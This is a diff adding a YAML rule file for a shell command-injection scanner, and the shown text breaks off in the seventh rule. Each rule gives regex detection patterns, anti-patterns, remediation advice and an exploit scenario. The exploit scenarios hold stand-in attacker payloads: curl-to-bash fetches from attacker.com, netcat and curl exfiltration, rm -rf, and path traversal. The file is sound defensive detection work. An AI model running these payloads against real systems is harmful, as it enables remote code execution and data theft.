@@ -1,0 +1,1673 @@
+rules:
+- rule_id: SHELL-INJ-001
+  title: Command Injection via Backtick Substitution
+  description: 'Detects command injection vulnerabilities where user-controlled input is interpolated inside backtick command substitution or $() subshells in shell scripts. Backticks interpret their contents
+    as commands, so any unsanitized variable expansion within them allows arbitrary command execution on the host system.
+
+    '
+  language: shell
+  category: injection
+  severity: Critical
+  confidence: 0.95
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - backtick
+  - subshell
+  - rce
+  - shell-metacharacters
+  detection_layer: 2
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: '`[^`]*\$\{?\w+\}?[^`]*`'
+    description: Backtick substitution containing variable expansion
+  - type: regex
+    pattern: '`[^`]*\$[1-9@\*][^`]*`'
+    description: Backtick substitution with positional parameter
+  - type: regex
+    pattern: \$\([^)]*\$\{?\w+\}?[^)]*\)
+    description: Dollar-paren subshell containing variable expansion
+  - type: regex
+    pattern: '`[^`]*\$\(.*\)[^`]*`'
+    description: Nested backtick and dollar-paren substitution
+  - type: regex
+    pattern: '[a-zA-Z_]\w{0,60}=`[^`]*\$\w{1,40}[^`]*`'
+    description: Assignment from backtick substitution with variable
+  - type: regex
+    pattern: echo\s+`[^`]*\$\{?\w+\}?[^`]*`
+    description: Echo with backtick substitution containing variable
+  anti_patterns:
+  - '# shellcheck'
+  - shellcheck disable
+  - set -euo pipefail
+  - 'readonly '
+  - declare -r
+  - local -r
+  - ${var:-default}
+  - shlex.quote
+  - printf '%q'
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  - escapeshellarg
+  - '# nosec'
+  bypass_variants:
+  - description: Backtick injection via IFS manipulation
+    pattern: IFS=.*`[^`]*\$\w+
+  - description: Encoded backtick via hex escape
+    pattern: \\x60[^\\x60]*\$\w+.*\\x60
+  - description: Nested subshell via eval and backtick
+    pattern: eval\s+.*`[^`]*\$\w+
+  evasion_indicators:
+  - hex-encoded backtick
+  - nested eval with substitution
+  - IFS manipulation before substitution
+  - variable indirection
+  encoding_variants:
+  - type: hex_escape
+    pattern: \\x60.*\\x60
+  - type: octal_escape
+    pattern: \\140.*\\140
+  multi_function_chain_patterns:
+  - read input; command=`$input`
+  - curl $url | `cat`
+  - eval `command $user_var`
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary command execution on host via backtick substitution
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $1, $2, $@, $*
+    sink: backtick or $() substitution
+    through: unquoted variable expansion
+  - source: read variable
+    sink: command substitution
+    through: direct interpolation
+  - source: environment variable
+    sink: subshell execution
+    through: unvalidated expansion
+  impact: 'Successful exploitation allows arbitrary command execution on the host
+
+    system with the privileges of the running shell process. This can lead
+
+    to full system compromise, data exfiltration, lateral movement, and
+
+    persistent backdoor installation.
+
+    '
+  remediation: '- Avoid backtick substitution; prefer $() which is more readable.
+
+    - Always double-quote variable expansions: "$variable".
+
+    - Use arrays for command arguments instead of string interpolation.
+
+    - Validate and sanitize all external input before use in commands.
+
+    - Use printf ''%q'' to escape shell metacharacters.
+
+    - Enable shellcheck in CI/CD pipelines.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://www.shellcheck.net/
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - '#!/bin/sh'
+    - '#!/usr/bin/env bash'
+    - 'function '
+    - read -r
+    - getopts
+    taint_source_indicators:
+    - $1
+    - $@
+    - $*
+    - 'read '
+    - QUERY_STRING
+    - HTTP_
+    taint_sink_indicators:
+    - eval
+    - exec
+    - system
+    - popen
+    - backtick
+    - $(
+    sanitization_patterns:
+    - printf '%q'
+    - shlex.quote
+    - escapeshellarg
+    - '[[ $var =~ ^[a-zA-Z0-9]+$ ]]'
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A shell script uses backtick substitution with an unsanitized
+
+      filename: result=`cat $filename`. An attacker provides
+
+      filename="; rm -rf / #" to execute a destructive command.
+
+      '
+    example_payload: 'filename=''; curl attacker.com/shell.sh | bash #'''
+    attacker_objective: Execute arbitrary OS commands via backtick substitution
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-002
+    - SHELL-INJ-003
+    - SHELL-INJ-010
+- rule_id: SHELL-INJ-002
+  title: Unquoted Variable Expansion in Commands
+  description: 'Detects shell commands where variables are expanded without double quoting, enabling word splitting and glob expansion attacks. When user input flows into unquoted variables used in command
+    arguments, attackers can inject additional arguments, redirect output, or trigger filename globbing.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - word-splitting
+  - glob-expansion
+  - unquoted-variable
+  - shell-script
+  detection_layer: 2
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: (?:rm|mv|cp|chmod|chown|mkdir|cat|ls)\s+[^"']*\$\{?\w+\}?(?:\s|$)
+    description: File operation with unquoted variable
+  - type: regex
+    pattern: (?:curl|wget|fetch)\s+[^"']*\$\{?\w+\}?
+    description: Network tool with unquoted variable URL
+  - type: regex
+    pattern: for\s+\w+\s+in\s+\$\{?\w+\}?(?:\s|;)
+    description: For loop iterating over unquoted variable
+  - type: regex
+    pattern: \[\s+-[a-z]\s+\$\w+\s+\]
+    description: Test expression with unquoted variable
+  - type: regex
+    pattern: (?:tar|zip|unzip|gzip)\s+.*\$\{?\w+\}?[^"']
+    description: Archive command with unquoted variable
+  - type: regex
+    pattern: cd\s+\$\w+
+    description: cd with unquoted variable path
+  anti_patterns:
+  - '"${'
+  - '"$('
+  - set -u
+  - set -euo pipefail
+  - shellcheck
+  - 'readonly '
+  - declare -r
+  - local -r
+  - '# SC2086'
+  - ${var:?}
+  - printf "%q"
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  bypass_variants:
+  - description: Word splitting via IFS modification
+    pattern: IFS=[^;]*;\s*\w+=\$\w+
+  - description: Glob injection via unquoted wildcard variable
+    pattern: \$\w+\s*\*
+  - description: Argument injection via space in variable
+    pattern: \w+\s+\$\w+\s+\$\w+
+  evasion_indicators:
+  - IFS manipulation
+  - glob pattern in variable
+  - space-containing values
+  - newline injection in variable
+  encoding_variants:
+  - type: newline_injection
+    pattern: \\n.*\$\w+
+  - type: tab_injection
+    pattern: \\t.*\$\w+
+  multi_function_chain_patterns:
+  - read input; rm $input
+  - filename=$1; cat $filename
+  - dir=$INPUT; ls $dir
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Argument injection and word splitting allow additional command arguments
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: positional parameter $1
+    sink: file operation command
+    through: unquoted variable expansion
+  - source: read variable
+    sink: command argument
+    through: word splitting on spaces
+  - source: environment variable
+    sink: path argument
+    through: glob expansion
+  impact: 'Unquoted variable expansion enables word splitting and glob expansion,
+
+    allowing attackers to inject additional command arguments, access
+
+    unintended files, or alter command behavior through crafted input.
+
+    '
+  remediation: '- Always double-quote variable expansions: "$variable".
+
+    - Use arrays for lists of arguments: "${args[@]}".
+
+    - Enable shellcheck SC2086 warning in CI/CD pipelines.
+
+    - Use set -u to catch unset variable usage.
+
+    - Use [[ ]] instead of [ ] for conditionals.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://mywiki.wooledge.org/Quotes
+  - https://www.shellcheck.net/wiki/SC2086
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - '#!/bin/sh'
+    - 'function '
+    - 'read '
+    taint_source_indicators:
+    - $1
+    - $@
+    - 'read '
+    - QUERY_STRING
+    taint_sink_indicators:
+    - 'rm '
+    - 'mv '
+    - 'cp '
+    - 'cat '
+    - 'chmod '
+    sanitization_patterns:
+    - '"$variable"'
+    - printf "%q"
+    - '[[ ]]'
+    - set -u
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A backup script uses rm $cleanup_dir without quoting. An attacker
+
+      sets cleanup_dir to "/tmp/x /etc/passwd" causing deletion of both.
+
+      '
+    example_payload: cleanup_dir='/tmp/safe /etc/important_config'
+    attacker_objective: Manipulate file operations by injecting spaces or glob patterns
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-001
+    - SHELL-INJ-003
+    - SHELL-INJ-009
+- rule_id: SHELL-INJ-003
+  title: Eval with User Input
+  description: 'Detects use of the eval built-in with variables or expressions that may contain user-controlled input. eval interprets its arguments as shell commands, making it one of the most dangerous
+    shell constructs when combined with unsanitized input.
+
+    '
+  language: shell
+  category: injection
+  severity: Critical
+  confidence: 0.97
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - eval-injection
+  - command-injection
+  - rce
+  - shell-builtin
+  - critical
+  detection_layer: 1
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: eval\s+[^"']*\$\{?\w+\}?
+    description: eval with unquoted variable
+  - type: regex
+    pattern: eval\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: eval with variable inside double quotes
+  - type: regex
+    pattern: eval\s+\$\([^)]*\)
+    description: eval with command substitution
+  - type: regex
+    pattern: eval\s+`[^`]*`
+    description: eval with backtick substitution
+  - type: regex
+    pattern: eval\s+"?\$\{?[A-Za-z_]\w*\}?"?
+    description: eval with direct variable reference
+  - type: regex
+    pattern: \beval\b.*\$[1-9@\*#]
+    description: eval with positional parameters
+  anti_patterns:
+  - '# safe: constant'
+  - eval set --
+  - eval $(dircolors
+  - eval $(ssh-agent
+  - eval "$(pyenv init
+  - eval "$(rbenv init
+  - eval "$(nodenv init
+  - shellcheck disable=SC2046
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  - 'readonly '
+  - declare -r
+  - local -r
+  bypass_variants:
+  - description: Eval disguised via variable indirection
+    pattern: cmd=eval;\s*\$cmd\s+\$\w+
+  - description: Eval via bash -c wrapper
+    pattern: bash\s+-c\s+.*eval.*\$\w+
+  - description: Eval constructed from concatenated strings
+    pattern: e="ev";\s*a="al";\s*\$e\$a
+  evasion_indicators:
+  - variable indirection to eval
+  - string concatenation to build eval
+  - alias for eval
+  - function wrapping eval
+  encoding_variants:
+  - type: base64_decode
+    pattern: eval\s+\$\(base64\s+-d
+  - type: hex_decode
+    pattern: eval\s+\$\(echo\s+-e\s+.*\\x
+  multi_function_chain_patterns:
+  - read cmd; eval $cmd
+  - user_input=$1; eval $user_input
+  - cmd=$(curl $url); eval $cmd
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Direct arbitrary command execution through eval built-in
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: positional parameter $1
+    sink: eval built-in
+    through: direct variable pass
+  - source: read from stdin
+    sink: eval command
+    through: unvalidated string
+  - source: HTTP request parameter
+    sink: eval in CGI script
+    through: QUERY_STRING variable
+  impact: 'eval with user input provides direct arbitrary command execution on
+
+    the host system. This is one of the most critical vulnerability patterns,
+
+    enabling full system compromise with the privileges of the running process.
+
+    '
+  remediation: '- Eliminate eval usage entirely where possible.
+
+    - Use associative arrays or case statements instead of eval.
+
+    - If eval is necessary, strictly validate input against a whitelist.
+
+    - Use declare -n for indirect variable references (Bash 4.3+).
+
+    - Never pass user input to eval under any circumstances.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://mywiki.wooledge.org/BashFAQ/048
+  - https://www.shellcheck.net/wiki/SC2091
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'read '
+    - getopts
+    - 'function '
+    - 'while '
+    taint_source_indicators:
+    - $1
+    - $@
+    - 'read '
+    - QUERY_STRING
+    - curl
+    - wget
+    taint_sink_indicators:
+    - eval
+    - bash -c
+    - sh -c
+    sanitization_patterns:
+    - case $var in
+    - '[[ $var =~ ^[a-zA-Z]+$ ]]'
+    - declare -n
+    - readonly
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A script reads a configuration key from user input and uses eval
+
+      to access it: eval "value=\$$key_name". An attacker provides
+
+      key_name=''x; curl attacker.com/payload | bash'' to execute RCE.
+
+      '
+    example_payload: key_name='x$(curl attacker.com/shell.sh|bash)'
+    attacker_objective: Achieve remote code execution by injecting commands through eval
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-001
+    - SHELL-INJ-002
+    - SHELL-INJ-005
+- rule_id: SHELL-INJ-004
+  title: Curl/Wget to User-Controlled URL
+  description: 'Detects shell commands where curl, wget, or similar HTTP clients fetch content from a URL constructed with user-controlled variables. This enables SSRF, data exfiltration, and RCE when fetched
+    content is piped to a shell interpreter.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-918
+  owasp: A10:2021-Server-Side-Request-Forgery
+  tags:
+  - ssrf
+  - curl
+  - wget
+  - url-injection
+  - data-exfiltration
+  - rce-via-download
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: curl\s+[^|;]*\$\{?\w+\}?
+    description: curl with variable in URL or arguments
+  - type: regex
+    pattern: wget\s+[^|;]*\$\{?\w+\}?
+    description: wget with variable in URL or arguments
+  - type: regex
+    pattern: curl\s+.*\$\w+.*\|\s*(?:bash|sh|zsh|eval)
+    description: curl piped to shell interpreter with variable
+  - type: regex
+    pattern: wget\s+-O\s*-\s+.*\$\w+.*\|\s*(?:bash|sh)
+    description: wget output piped to shell interpreter
+  - type: regex
+    pattern: curl\s+.*-o\s+\S+\s+.*\$\w+
+    description: curl downloading to file with user-controlled URL
+  - type: regex
+    pattern: curl\s+.*--data.*\$\{?\w+\}?.*\$\{?\w+\}?
+    description: curl POST with user data to user URL
+  anti_patterns:
+  - '# hardcoded URL'
+  - https://github.com
+  - https://registry.
+  - https://api.github.com
+  - apt-get
+  - brew install
+  - pip install
+  - --fail
+  - --max-time
+  - --connect-timeout
+  - sanitize
+  - validate_url
+  - whitelist
+  - allowlist
+  - curl --version
+  bypass_variants:
+  - description: SSRF via URL encoding in variable
+    pattern: curl\s+.*%[0-9a-fA-F]{2}.*\$\w+
+  - description: DNS rebinding via user-controlled hostname
+    pattern: curl\s+.*\$\{?hostname\}?
+  - description: File protocol SSRF via curl
+    pattern: curl\s+.*file://.*\$\w+
+  evasion_indicators:
+  - URL encoding bypass
+  - DNS rebinding
+  - file:// protocol
+  - gopher:// protocol
+  encoding_variants:
+  - type: url_encoding
+    pattern: curl\s+.*%2[fF]%2[fF].*\$\w+
+  - type: double_encoding
+    pattern: curl\s+.*%25%32%66.*\$\w+
+  multi_function_chain_patterns:
+  - url=$1; curl $url | bash
+  - read url; wget -O- $url | sh
+  - curl $API_URL/$(echo $user_input)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: SSRF to internal services or RCE via curl pipe to shell
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied URL parameter
+    sink: curl/wget command
+    through: unvalidated variable expansion
+  - source: API endpoint parameter
+    sink: HTTP client command
+    through: string concatenation
+  - source: configuration file URL
+    sink: download and execute
+    through: pipe to shell
+  impact: 'Fetching URLs from user input enables SSRF attacks against internal
+
+    services, cloud metadata endpoints (169.254.169.254), and data
+
+    exfiltration. When piped to shell, it enables full RCE.
+
+    '
+  remediation: '- Validate URLs against a strict allowlist of domains and protocols.
+
+    - Never pipe curl/wget output directly to a shell interpreter.
+
+    - Use --max-time and --connect-timeout to limit request duration.
+
+    - Block access to internal IP ranges and metadata service IPs.
+
+    - Verify downloaded content integrity with checksums before execution.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/918.html
+  - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+  - https://curl.se/docs/manpage.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'function '
+    - 'read '
+    - getopts
+    taint_source_indicators:
+    - $1
+    - $URL
+    - read url
+    - QUERY_STRING
+    taint_sink_indicators:
+    - 'curl '
+    - 'wget '
+    - '| bash'
+    - '| sh'
+    sanitization_patterns:
+    - validate_url
+    - allowlist
+    - --max-time
+    - checksum verification
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A deployment script accepts a plugin URL: curl -sL "$plugin_url" | bash.
+
+      An attacker provides a malicious URL hosting a reverse shell script.
+
+      '
+    example_payload: plugin_url='https://evil.com/reverse_shell.sh'
+    attacker_objective: Execute remote payloads or access internal services via SSRF
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-003
+    - SHELL-INJ-005
+    - SHELL-INJ-006
+- rule_id: SHELL-INJ-005
+  title: Dynamic Pipe Chains with User Input
+  description: 'Detects shell commands where user-controlled variables are used to construct pipe chains dynamically. Attackers can inject additional pipe segments, redirect output, or chain arbitrary commands
+    by manipulating variables used in pipeline construction.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - pipe-injection
+  - command-chain
+  - command-injection
+  - rce
+  - pipeline
+  detection_layer: 2
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: \|\s*\$\{?\w+\}?
+    description: Pipe to user-controlled command
+  - type: regex
+    pattern: \$\{?\w+\}?\s*\|
+    description: User-controlled command piped to another
+  - type: regex
+    pattern: echo\s+.*\$\w+.*\|\s*\$\w+
+    description: Echo user data piped to user command
+  - type: regex
+    pattern: cat\s+.*\|\s*\$\{?\w+\}?
+    description: Cat piped to user-controlled command
+  - type: regex
+    pattern: '[a-zA-Z_]\w{0,60}\s*\|\s*\$\{?\w{1,40}\}?\s*\|\s*\w{1,40}'
+    description: Variable command in middle of pipe chain
+  - type: regex
+    pattern: eval\s+".*\|.*\$\w+.*"
+    description: eval constructing pipe chain with variables
+  anti_patterns:
+  - set -euo pipefail
+  - set -o pipefail
+  - shellcheck
+  - 'readonly '
+  - declare -r
+  - '| grep'
+  - '| awk'
+  - '| sed'
+  - '| sort'
+  - '| head'
+  - '| tail'
+  - '| wc'
+  - sanitize
+  - validate
+  - whitelist
+  bypass_variants:
+  - description: Pipe injection via semicolon in variable
+    pattern: \$\w+;[^|]*\|
+  - description: Process substitution injection
+    pattern: <\(\s*\$\w+\s*\)
+  - description: Named pipe (FIFO) injection
+    pattern: mkfifo.*\$\w+
+  evasion_indicators:
+  - semicolon injection in pipe variable
+  - process substitution with user data
+  - named pipe manipulation
+  - heredoc injection in pipeline
+  encoding_variants:
+  - type: newline_injection
+    pattern: \\n\s*\|.*\$\w+
+  - type: null_byte
+    pattern: \\0.*\|.*\$\w+
+  multi_function_chain_patterns:
+  - filter=$1; cat data | $filter
+  - cmd=$1; echo input | $cmd | output
+  - processor=$INPUT; data | $processor
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary command injection via pipe chain manipulation
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied filter command
+    sink: pipe chain segment
+    through: unvalidated variable in pipeline
+  - source: configuration parameter
+    sink: dynamic command pipeline
+    through: string interpolation
+  impact: 'Dynamic pipe chains with user input allow attackers to inject
+
+    additional commands, redirect output to attacker-controlled
+
+    destinations, or execute arbitrary code.
+
+    '
+  remediation: '- Avoid constructing pipe chains dynamically with user input.
+
+    - Use predefined command lists and case statements instead.
+
+    - Set pipefail option to detect failures in pipe chains.
+
+    - Validate pipe commands against a strict allowlist.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://mywiki.wooledge.org/BashPitfalls
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'function '
+    - 'read '
+    taint_source_indicators:
+    - $1
+    - 'read '
+    - QUERY_STRING
+    taint_sink_indicators:
+    - '| $var'
+    - $var |
+    - eval
+    sanitization_patterns:
+    - case statement
+    - allowlist
+    - set -o pipefail
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A log processing script allows users to specify a filter command:
+
+      cat /var/log/app.log | $filter_cmd. An attacker passes
+
+      filter_cmd="tee /tmp/exfil | curl -d @- attacker.com".
+
+      '
+    example_payload: filter_cmd='tee /dev/stderr | nc attacker.com 4444'
+    attacker_objective: Inject malicious commands into pipeline for data exfiltration or RCE
+  confidence_factors:
+    pattern_strength: high
+    context_match: medium
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-001
+    - SHELL-INJ-003
+- rule_id: SHELL-INJ-006
+  title: Source/Dot Command with User-Controlled Path
+  description: 'Detects use of the source or dot (.) built-in with a path derived from user-controlled input. The source command executes a file in the current shell context, meaning any code in the sourced
+    file runs with the current shell privileges and can modify environment variables.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.93
+  cwe: CWE-829
+  owasp: A03:2021-Injection
+  tags:
+  - source-injection
+  - dot-command
+  - file-inclusion
+  - rce
+  - environment-manipulation
+  detection_layer: 1
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: source\s+\$\{?\w+\}?
+    description: source command with variable path
+  - type: regex
+    pattern: \.\s+\$\{?\w+\}?
+    description: dot command with variable path
+  - type: regex
+    pattern: source\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: source with variable inside quoted path
+  - type: regex
+    pattern: \.\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: dot with variable inside quoted path
+  - type: regex
+    pattern: source\s+\$\(.*\)
+    description: source with command substitution as path
+  - type: regex
+    pattern: source\s+/[^/]*\$\w+
+    description: source with partial path containing variable
+  anti_patterns:
+  - source /etc/
+  - source ~/.bashrc
+  - source ~/.profile
+  - source ./venv/
+  - . /etc/os-release
+  - source /usr/share/
+  - source $(brew
+  - 'readonly '
+  - declare -r
+  - '# fixed path'
+  - sanitize
+  - validate
+  - whitelist
+  - realpath
+  - readlink -f
+  bypass_variants:
+  - description: Path traversal in source path variable
+    pattern: source\s+.*\.\./.*\$\w+
+  - description: Symlink injection for source path
+    pattern: ln\s+-s.*;\s*source\s+
+  - description: Race condition in source path
+    pattern: source\s+/tmp/.*\$\w+
+  evasion_indicators:
+  - path traversal in source
+  - symlink manipulation
+  - TOCTOU race condition
+  - /tmp or /var/tmp paths
+  encoding_variants:
+  - type: path_traversal
+    pattern: source\s+.*\.\./
+  - type: null_byte
+    pattern: source\s+.*\\x00
+  multi_function_chain_patterns:
+  - config=$1; source $config
+  - read path; . $path
+  - plugin_dir=$1; source $plugin_dir/init.sh
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Execute arbitrary code in current shell context via file inclusion
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied config path
+    sink: source/dot built-in
+    through: unvalidated path variable
+  - source: plugin directory parameter
+    sink: source command
+    through: path concatenation
+  impact: 'Source with user-controlled paths allows execution of arbitrary shell
+
+    code in the current process context, with full access to all environment
+
+    variables, functions, and the calling shell privileges.
+
+    '
+  remediation: '- Never use user input directly in source/dot paths.
+
+    - Validate source paths against a strict allowlist of directories.
+
+    - Use realpath to canonicalize paths and prevent traversal.
+
+    - Set file permissions to prevent modification of sourceable files.
+
+    - Verify file integrity with checksums before sourcing.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/829.html
+  - https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'function '
+    - 'read '
+    - getopts
+    taint_source_indicators:
+    - $1
+    - read path
+    - PLUGIN_DIR
+    - CONFIG_PATH
+    taint_sink_indicators:
+    - 'source '
+    - '. '
+    sanitization_patterns:
+    - realpath
+    - readlink -f
+    - allowlist
+    - case statement
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A plugin system sources user-specified configuration files:
+
+      source "$PLUGIN_DIR/$plugin_name/config.sh". An attacker uses
+
+      path traversal: plugin_name="../../tmp/evil" to source malicious code.
+
+      '
+    example_payload: plugin_name='../../tmp/malicious_config'
+    attacker_objective: Execute arbitrary shell code via file inclusion attack
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-003
+    - SHELL-INJ-004
+- rule_id: SHELL-INJ-007
+  title: Awk/Sed with User-Controlled Pattern
+  description: 'Detects awk and sed commands where the pattern or expression is derived from user-controlled input. Awk supports system() and pipe operators for command execution, while sed supports the
+    e flag for evaluating pattern space as a command. Both can be weaponized for arbitrary RCE.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - awk-injection
+  - sed-injection
+  - command-injection
+  - pattern-injection
+  - text-processing
+  detection_layer: 2
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: awk\s+[^|;]*\$\{?\w+\}?
+    description: awk with variable in program or arguments
+  - type: regex
+    pattern: sed\s+[^|;]*\$\{?\w+\}?
+    description: sed with variable in expression
+  - type: regex
+    pattern: awk\s+-v\s+\w+=\$\{?\w+\}?
+    description: awk variable assignment from user input
+  - type: regex
+    pattern: awk\s+.*system\s*\(
+    description: awk using system() function
+  - type: regex
+    pattern: sed\s+.*e\s*[;/]
+    description: sed with e flag for command evaluation
+  - type: regex
+    pattern: awk\s+.*\|.*getline
+    description: awk pipe with getline for command execution
+  - type: regex
+    pattern: gawk\s+[^|;]*\$\{?\w+\}?
+    description: gawk with user-controlled arguments
+  anti_patterns:
+  - awk '{print $
+  - awk -F
+  - sed -i 's/
+  - sed 's/^/
+  - awk 'NR==
+  - awk '/pattern/
+  - 'readonly '
+  - declare -r
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  - '# constant pattern'
+  - '# fixed expression'
+  - shellcheck
+  bypass_variants:
+  - description: Awk system() call injection
+    pattern: awk\s+.*system\s*\(\s*[^)]*\$\w+
+  - description: Sed e flag command execution
+    pattern: sed\s+.*s/.*/.*/e
+  - description: Awk pipe to shell via printf
+    pattern: awk\s+.*printf.*\|.*sh
+  evasion_indicators:
+  - awk system() injection
+  - sed e-flag execution
+  - awk pipe to shell
+  - gawk network features
+  encoding_variants:
+  - type: octal_escape
+    pattern: awk\s+.*\\[0-7]{3}
+  - type: hex_escape
+    pattern: awk\s+.*\\x[0-9a-fA-F]{2}
+  multi_function_chain_patterns:
+  - pattern=$1; awk "/$pattern/" file
+  - expr=$1; sed "s/$expr//g" file
+  - field=$1; awk -v f=$field '{print $f}' file
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Command execution via awk system() or sed e-flag
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied search pattern
+    sink: awk/sed program argument
+    through: unvalidated variable interpolation
+  - source: API parameter
